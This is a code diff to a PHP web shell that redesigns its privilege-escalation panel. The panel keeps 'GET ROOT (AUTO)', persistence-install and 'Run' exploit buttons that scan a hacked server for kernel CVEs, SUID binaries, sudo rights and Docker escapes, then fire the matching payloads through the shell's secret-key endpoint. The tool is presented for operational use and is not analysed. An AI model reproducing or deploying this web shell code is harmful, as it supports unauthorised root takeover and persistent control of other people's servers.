@@ -1826,36 +1826,8 @@ function list_dir($path) {
         .file-table th.sort-asc .sort-indicator, .file-table th.sort-desc .sort-indicator { color: #0f0; font-weight: bold; }
         .file-table th .sort-indicator { color: #666; margin-left: 5px; }
         /* 🔥 Privilege Escalation Styles */
-        .privesc-container { display: flex; gap: 20px; }
-        .privesc-sidebar { width: 350px; min-width: 350px; border-right: 1px solid #0f0; padding: 15px; background: #1a1a1a; overflow-y: auto; max-height: 70vh; }
-        .privesc-main { flex: 1; overflow-y: auto; max-height: 70vh; padding: 15px; }
-        .privesc-category { border: 1px solid #333; margin: 10px 0; padding: 12px; border-radius: 6px; background: #222; }
-        .privesc-category.vulnerable { border-color: #f44; background: #2a0000; }
-        .privesc-category.safe { border-color: #0f0; background: #001a00; }
-        .privesc-category-title { font-weight: bold; font-size: 14px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
-        .privesc-item { padding: 8px; margin: 5px 0; background: #1a1a1a; border-radius: 4px; border-left: 3px solid #6cf; }
-        .privesc-item.critical { border-left-color: #f44; }
-        .privesc-item.high { border-left-color: #ff0; }
-        .privesc-item.medium { border-left-color: #6cf; }
-        .privesc-exploit-btn { background: #f44; color: white; border: none; padding: 5px 12px; border-radius: 4px; cursor: pointer; font-size: 11px; margin-left: 10px; }
-        .privesc-exploit-btn:hover { background: #f66; }
-        .privesc-getroot-btn { background: linear-gradient(135deg, #f44, #f80); color: white; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin: 10px 0; text-transform: uppercase; letter-spacing: 2px; }
-        .privesc-getroot-btn:hover { background: linear-gradient(135deg, #f66, #fa0); box-shadow: 0 0 20px rgba(255, 68, 68, 0.5); }
-        .privesc-getroot-btn:disabled { background: #444; cursor: not-allowed; box-shadow: none; }
-        .privesc-status { padding: 10px; margin: 10px 0; border-radius: 4px; background: #1a1a1a; border: 1px solid #333; }
-        .privesc-status.success { border-color: #0f0; background: #001a00; }
-        .privesc-status.error { border-color: #f44; background: #2a0000; }
-        .privesc-output { background: #000; border: 1px solid #0f0; padding: 10px; font-family: monospace; font-size: 12px; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
-        .privesc-log { background: #000; border: 1px solid #333; padding: 8px; font-family: monospace; font-size: 10px; height: 150px; overflow-y: auto; border-radius: 4px; }
-        .privesc-log-entry { padding: 2px 0; border-bottom: 1px solid #1a1a1a; }
-        .privesc-log-time { color: #666; font-size: 9px; }
-        .privesc-log-info { color: #6cf; }
-        .privesc-log-success { color: #0f0; }
-        .privesc-log-error { color: #f44; }
-        .privesc-log-warn { color: #ff0; }
-        .privesc-progress { margin: 10px 0; }
-        .privesc-progress-bar { height: 4px; background: #333; border-radius: 2px; overflow: hidden; }
-        .privesc-progress-fill { height: 100%; background: linear-gradient(90deg, #0f0, #6cf); width: 0%; transition: width 0.3s ease; }
+        /* Compact Privesc Styles */
+        .privesc-output { background: #000; border: 1px solid #333; padding: 8px; font-family: monospace; font-size: 11px; white-space: pre-wrap; max-height: 150px; overflow-y: auto; border-radius: 4px; }
         .chmod-options { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
         .chmod-options label { white-space: nowrap; }
         .navigation-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
@@ -2453,52 +2425,40 @@ function list_dir($path) {
 
 <!-- 🔥 Privilege Escalation Modal -->
 <div class="modal" id="privescModal">
-    <div class="modal-content modal-wide">
-        <div class="modal-header">
-            <h3>💀 Auto Privilege Escalation</h3>
+    <div class="modal-content" style="max-width: 900px; width: 90vw; max-height: 85vh;">
+        <div class="modal-header" style="padding: 10px 15px;">
+            <h3 style="margin:0;">💀 Privilege Escalation</h3>
+            <button onclick="closeModal('privescModal')" style="padding: 4px 12px;">✕</button>
         </div>
-        <div class="privesc-container">
-            <div class="privesc-sidebar">
-                <button id="getRootBtn" class="privesc-getroot-btn" onclick="autoGetRoot()">
-                    🔥 GET ROOT (AUTO)
-                </button>
-                <div id="privescStatus" class="privesc-status" style="display:none;"></div>
-                
-                <h4 style="color:#6cf;margin:15px 0 10px 0;font-size:13px;">⚡ Quick Actions</h4>
-                <button onclick="scanPrivesc()" style="width:100%;margin:5px 0;padding:10px;background:#0f0;color:#111;font-weight:bold;">🔍 Scan All Vectors</button>
-                <button onclick="installPersistence()" style="width:100%;margin:5px 0;padding:10px;background:#f80;color:#111;font-weight:bold;">🔒 Install Persistence</button>
-                <button onclick="scanOtherShells()" style="width:100%;margin:5px 0;padding:10px;background:#f44;color:#fff;font-weight:bold;">🕵️ Scan Other Shells</button>
-                
-                <h4 style="color:#6cf;margin:15px 0 10px 0;font-size:13px;">📊 Statistics</h4>
-                <div id="privescStats" style="font-size:11px;color:#888;">
-                    <div>Kernel: <span id="statKernel">Unknown</span></div>
-                    <div>SUID Files: <span id="statSuid">0</span></div>
-                    <div>Sudo Access: <span id="statSudo">No</span></div>
-                    <div>Docker: <span id="statDocker">No</span></div>
-                </div>
-                
-                <h4 style="color:#6cf;margin:15px 0 10px 0;font-size:13px;">📝 Live Log</h4>
-                <div id="privescLog" class="privesc-log" style="display:none;"></div>
+        <div style="padding: 10px 15px;">
+            <!-- Action Buttons Row -->
+            <div style="display:flex;gap:8px;margin-bottom:10px;">
+                <button id="getRootBtn" onclick="autoGetRoot()" style="flex:2;background:linear-gradient(135deg,#f44,#f80);color:#fff;font-weight:bold;padding:10px;font-size:14px;border:none;border-radius:4px;cursor:pointer;">🔥 GET ROOT (AUTO)</button>
+                <button onclick="scanPrivesc()" style="flex:1;background:#0f0;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔍 Scan</button>
+                <button onclick="installPersistence()" style="flex:1;background:#f80;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔒 Persist</button>
             </div>
-            <div class="privesc-main">
-                <div id="privescResults">
-                    <div style="text-align:center;padding:50px;color:#666;">
-                        <span style="font-size:50px;">💀</span>
-                        <h3 style="color:#f44;margin:15px 0;">Privilege Escalation Scanner</h3>
-                        <p>Click "🔍 Scan All Vectors" to begin scanning<br>or "🔥 GET ROOT (AUTO)" for automatic exploitation</p>
-                        <div style="margin-top:20px;text-align:left;padding:15px;background:#1a1a1a;border-radius:6px;font-size:11px;color:#888;">
-                            <p style="color:#6cf;margin-bottom:10px;"><strong>⚠️ Warning:</strong></p>
-                            <p>• This tool attempts privilege escalation automatically</p>
-                            <p>• May trigger security alerts on monitored systems</p>
-                            <p>• Always use in authorized testing environments only</p>
-                        </div>
-                    </div>
-                </div>
-                <div id="privescOutput" class="privesc-output" style="display:none;margin-top:15px;"></div>
+            
+            <!-- Status Bar -->
+            <div id="privescStatus" style="display:none;margin-bottom:10px;padding:8px;background:#1a1a1a;border:1px solid #333;border-radius:4px;font-size:12px;"></div>
+            
+            <!-- Stats Row -->
+            <div style="display:flex;gap:15px;margin-bottom:10px;padding:8px;background:#111;border-radius:4px;font-size:11px;color:#888;">
+                <span>🐛 <span id="statKernel">-</span></span>
+                <span>⚡ SUID: <span id="statSuid">0</span></span>
+                <span>🔑 Sudo: <span id="statSudo">No</span></span>
+                <span>🐳 Docker: <span id="statDocker">No</span></span>
             </div>
-        </div>
-        <div class="modal-footer">
-            <button onclick="closeModal('privescModal')">Close</button>
+            
+            <!-- Results Area -->
+            <div id="privescResults" style="min-height:100px;max-height:200px;overflow-y:auto;background:#0a0a0a;border:1px solid #0f0;border-radius:4px;padding:10px;margin-bottom:10px;">
+                <div style="text-align:center;padding:30px;color:#666;font-size:12px;">
+                    <span style="font-size:30px;">💀</span>
+                    <p style="margin:10px 0;">Click 🔥 GET ROOT (AUTO) to start</p>
+                </div>
+            </div>
+            
+            <!-- Output Log -->
+            <div id="privescOutput" style="display:none;height:120px;overflow-y:auto;background:#000;border:1px solid #333;border-radius:4px;padding:8px;font-family:monospace;font-size:11px;white-space:pre-wrap;"></div>
         </div>
     </div>
 </div>
@@ -3469,25 +3429,23 @@ function clearSqlResult() {
 // 🔥 Auto Privilege Escalation Functions
 let privescScanResults = null;
 
-// Utility: Add log entry to live log
+// Utility: Add log entry (now goes to output)
 function addPrivescLog(message, type = 'info') {
-    const logDiv = document.getElementById('privescLog');
-    if (!logDiv) return;
-    logDiv.style.display = 'block';
+    const outputDiv = document.getElementById('privescOutput');
+    if (!outputDiv) return;
+    outputDiv.style.display = 'block';
     const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
-    const entry = document.createElement('div');
-    entry.className = 'privesc-log-entry';
-    entry.innerHTML = '<span class="privesc-log-time">[' + time + ']</span> <span class="privesc-log-' + type + '">' + message + '</span>';
-    logDiv.appendChild(entry);
-    logDiv.scrollTop = logDiv.scrollHeight;
+    const color = type === 'success' ? '#0f0' : type === 'error' ? '#f44' : type === 'warn' ? '#ff0' : '#6cf';
+    outputDiv.innerHTML += '<span style="color:#666">[' + time + ']</span> <span style="color:' + color + '">' + message + '</span>\n';
+    outputDiv.scrollTop = outputDiv.scrollHeight;
 }
 
 // Utility: Clear log
 function clearPrivescLog() {
-    const logDiv = document.getElementById('privescLog');
-    if (logDiv) {
-        logDiv.innerHTML = '';
-        logDiv.style.display = 'block';
+    const outputDiv = document.getElementById('privescOutput');
+    if (outputDiv) {
+        outputDiv.innerHTML = '';
+        outputDiv.style.display = 'none';
     }
 }
 
@@ -3500,73 +3458,57 @@ function updatePrivescProgress(current, total) {
     }
 }
 
-// Sequential scan with realtime logging
+// Quick scan with compact output
 async function scanPrivesc() {
     const resultsDiv = document.getElementById('privescResults');
     const statusDiv = document.getElementById('privescStatus');
-    const vectors = ['kernel', 'suid', 'sudo', 'capabilities', 'docker', 'writable', 'cron', 'services'];
-    const vectorNames = {
-        kernel: '🐛 Kernel Exploits',
-        suid: '⚡ SUID Binaries', 
-        sudo: '🔑 Sudo Permissions',
-        capabilities: '🛡️ Capabilities',
-        docker: '🐳 Docker Escape',
-        writable: '📝 Writable Paths',
-        cron: '⏰ Cron Jobs',
-        services: '⚙️ Services'
-    };
+    const outputDiv = document.getElementById('privescOutput');
+    const vectors = ['kernel', 'suid', 'sudo', 'docker'];
+    const vectorEmojis = { kernel: '🐛', suid: '⚡', sudo: '🔑', docker: '🐳' };
     
     // Reset UI
-    resultsDiv.innerHTML = '<div style="text-align:center;padding:30px;"><p style="font-size:30px;animation:pulse 1s infinite;">🔍</p><p style="color:#0f0;">Initializing privilege escalation scan...</p></div>';
+    resultsDiv.innerHTML = '<div style="text-align:center;padding:20px;"><span style="font-size:24px;animation:pulse 1s infinite;">🔍</span><p style="color:#0f0;font-size:12px;margin-top:10px;">Scanning...</p></div>';
     statusDiv.style.display = 'block';
-    statusDiv.className = 'privesc-status';
-    clearPrivescLog();
-    addPrivescLog('Starting privilege escalation scan...', 'info');
-    addPrivescLog('Target: ' + window.location.hostname, 'info');
-    addPrivescLog('Vectors to scan: ' + vectors.length, 'info');
+    statusDiv.innerHTML = '⏳ Scanning...';
+    outputDiv.style.display = 'block';
+    outputDiv.innerHTML = '';
     
     const results = {};
-    let completed = 0;
+    let foundCount = 0;
     
-    // Scan each vector sequentially
+    // Scan key vectors only (faster)
     for (const vector of vectors) {
-        updatePrivescProgress(completed, vectors.length);
-        addPrivescLog('Scanning ' + vectorNames[vector] + '...', 'info');
-        
         try {
             const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=' + vector);
-            if (!response.ok) {
-                throw new Error('HTTP ' + response.status);
-            }
             const data = await response.json();
             
             if (data.success) {
-                results[vector === 'writable' ? 'writable_paths' : vector] = data.data;
+                results[vector] = data.data;
                 
-                // Log result immediately
                 if (vector === 'kernel' && data.data.vulnerable) {
-                    addPrivescLog('✓ Found ' + data.data.exploits.length + ' kernel exploits!', 'success');
+                    outputDiv.innerHTML += '<span style="color:#f44">🐛 ' + data.data.exploits.length + ' kernel CVEs</span>\n';
+                    foundCount++;
                 } else if (vector === 'suid' && data.data.exploitable.length > 0) {
-                    addPrivescLog('✓ Found ' + data.data.exploitable.length + ' exploitable SUID binaries!', 'success');
+                    outputDiv.innerHTML += '<span style="color:#ff0">⚡ ' + data.data.exploitable.length + ' SUID bins</span>\n';
+                    foundCount++;
+                    document.getElementById('statSuid').textContent = data.data.exploitable.length;
                 } else if (vector === 'sudo' && data.data.exploitable.length > 0) {
-                    addPrivescLog('✓ Found ' + data.data.exploitable.length + ' sudo exploits!', 'success');
+                    outputDiv.innerHTML += '<span style="color:#0f0">🔑 ' + data.data.exploitable.length + ' sudo</span>\n';
+                    foundCount++;
+                    document.getElementById('statSudo').textContent = 'Yes';
                 } else if (vector === 'docker' && data.data.escape_possible) {
-                    addPrivescLog('✓ Docker escape possible!', 'success');
-                } else {
-                    addPrivescLog('✓ ' + vectorNames[vector] + ' checked (safe)', 'info');
+                    outputDiv.innerHTML += '<span style="color:#6cf">🐳 Docker escape</span>\n';
+                    foundCount++;
+                    document.getElementById('statDocker').textContent = 'Yes';
                 }
-            } else {
-                addPrivescLog('✗ ' + vectorNames[vector] + ' failed: ' + (data.error || 'Unknown'), 'error');
             }
         } catch (error) {
-            addPrivescLog('✗ ' + vectorNames[vector] + ' error: ' + error.message, 'error');
+            // Silent fail
         }
-        
-        completed++;
     }
     
-    // Finalize
-    updatePrivescProgress(vectors.length, vectors.length);
+    statusDiv.innerHTML = foundCount > 0 ? '✅ Found ' + foundCount + ' vectors' : '⚠️ No easy vectors';
+    statusDiv.style.borderColor = foundCount > 0 ? '#0f0' : '#f44';
     privescScanResults = results;
     displayPrivescResults(results);
     updatePrivescStats(results);
@@ -3584,70 +3526,48 @@ async function scanPrivesc() {
 }
 
 function displayPrivescResults(results) {
-    let html = '';
+    let html = '<div style="display:flex;flex-direction:column;gap:8px;">';
     
-    // Kernel Exploits
-    if (results.kernel && results.kernel.vulnerable) {
-        html += '<div class="privesc-category vulnerable">';
-        html += '<div class="privesc-category-title"><span>🐛 Kernel Exploits</span><span style="color:#f44;">VULNERABLE</span></div>';
-        results.kernel.exploits.forEach(exp => {
-            html += '<div class="privesc-item ' + exp.severity.toLowerCase() + '">';
-            html += '<strong>' + exp.cve + '</strong> - ' + exp.name + '<br>';
-            html += '<small style="color:#888;">Kernel: ' + exp.kernel + '</small>';
-            html += '<button class="privesc-exploit-btn" onclick="runPrivescExploit(\'kernel\', \'' + exp.cve + '\')">Exploit</button>';
-            html += '</div>';
-        });
-        html += '</div>';
-    } else {
-        html += '<div class="privesc-category safe">';
-        html += '<div class="privesc-category-title"><span>🐛 Kernel Exploits</span><span style="color:#0f0;">SAFE</span></div>';
-        html += '<div style="padding:10px;color:#666;font-size:12px;">No known vulnerable kernel version detected</div>';
-        html += '</div>';
-    }
-    
-    // SUID Binaries
+    // SUID Binaries - Compact
     if (results.suid && results.suid.exploitable.length > 0) {
-        html += '<div class="privesc-category vulnerable">';
-        html += '<div class="privesc-category-title"><span>⚡ SUID Binaries</span><span style="color:#f44;">' + results.suid.exploitable.length + ' EXPLOITABLE</span></div>';
-        results.suid.exploitable.forEach(bin => {
-            html += '<div class="privesc-item critical">';
-            html += '<strong>' + bin.binary + '</strong><br>';
-            html += '<small style="color:#888;">' + bin.path + '</small><br>';
-            html += '<code style="font-size:10px;background:#000;padding:2px 5px;">' + escapeHtml(bin.payload) + '</code>';
-            html += '<button class="privesc-exploit-btn" onclick="runPrivescExploit(\'suid\', \'' + escapeHtml(bin.payload) + '\')">Run</button>';
+        html += '<div style="border:1px solid #f44;background:#2a0000;padding:8px;border-radius:4px;">';
+        html += '<div style="font-weight:bold;font-size:12px;color:#f44;margin-bottom:5px;">⚡ SUID (' + results.suid.exploitable.length + ')</div>';
+        results.suid.exploitable.slice(0, 3).forEach(bin => {
+            html += '<div style="font-size:11px;margin:3px 0;display:flex;justify-content:space-between;align-items:center;">';
+            html += '<code style="background:#000;padding:2px 5px;border-radius:3px;">' + bin.binary + '</code>';
+            html += '<button onclick="runPrivescExploit(\'suid\', \'' + escapeHtml(bin.payload) + '\')" style="background:#f44;color:#fff;border:none;padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer;">Run</button>';
             html += '</div>';
         });
         html += '</div>';
     }
     
-    // Sudo Permissions
+    // Sudo Permissions - Compact
     if (results.sudo && results.sudo.exploitable.length > 0) {
-        html += '<div class="privesc-category vulnerable">';
-        html += '<div class="privesc-category-title"><span>🔑 Sudo Permissions</span><span style="color:#f44;">' + results.sudo.exploitable.length + ' EXPLOITABLE</span></div>';
-        results.sudo.exploitable.forEach(sudo => {
-            html += '<div class="privesc-item ' + (sudo.severity === 'CRITICAL' ? 'critical' : 'high') + '">';
-            html += '<strong>' + sudo.method + '</strong><br>';
-            html += '<code style="font-size:10px;background:#000;padding:2px 5px;">' + escapeHtml(sudo.payload) + '</code>';
-            html += '<button class="privesc-exploit-btn" onclick="runPrivescExploit(\'sudo\', \'' + escapeHtml(sudo.payload) + '\')">Run</button>';
+        html += '<div style="border:1px solid #0f0;background:#001a00;padding:8px;border-radius:4px;">';
+        html += '<div style="font-weight:bold;font-size:12px;color:#0f0;margin-bottom:5px;">🔑 SUDO (' + results.sudo.exploitable.length + ')</div>';
+        results.sudo.exploitable.slice(0, 2).forEach(sudo => {
+            html += '<div style="font-size:11px;margin:3px 0;">';
+            html += '<code style="background:#000;padding:2px 5px;border-radius:3px;">' + escapeHtml(sudo.payload.substring(0, 40)) + '...</code>';
             html += '</div>';
         });
         html += '</div>';
     }
     
-    // Docker Escape
-    if (results.docker && results.docker.in_docker && results.docker.escape_possible) {
-        html += '<div class="privesc-category vulnerable">';
-        html += '<div class="privesc-category-title"><span>🐳 Docker Escape</span><span style="color:#f44;">ESCAPE POSSIBLE</span></div>';
-        results.docker.methods.forEach(method => {
-            html += '<div class="privesc-item critical">';
-            html += '<strong>' + method.method + '</strong><br>';
-            html += '<code style="font-size:10px;background:#000;padding:2px 5px;">' + escapeHtml(method.payload) + '</code>';
-            html += '<button class="privesc-exploit-btn" onclick="runPrivescExploit(\'docker\', \'' + escapeHtml(method.payload) + '\')">Escape</button>';
-            html += '</div>';
-        });
+    // Docker - Compact
+    if (results.docker && results.docker.escape_possible) {
+        html += '<div style="border:1px solid #6cf;background:#001a2a;padding:8px;border-radius:4px;">';
+        html += '<div style="font-weight:bold;font-size:12px;color:#6cf;">🐳 Docker Escape</div>';
         html += '</div>';
     }
     
+    // Kernel - Compact
+    if (results.kernel && results.kernel.vulnerable) {
+        html += '<div style="border:1px solid #ff0;background:#2a2a00;padding:8px;border-radius:4px;">';
+        html += '<div style="font-weight:bold;font-size:12px;color:#ff0;">🐛 Kernel: ' + results.kernel.exploits.length + ' CVEs</div>';
+        html += '</div>';
+    }
+    
+    html += '</div>';
     document.getElementById('privescResults').innerHTML = html;
 }
 
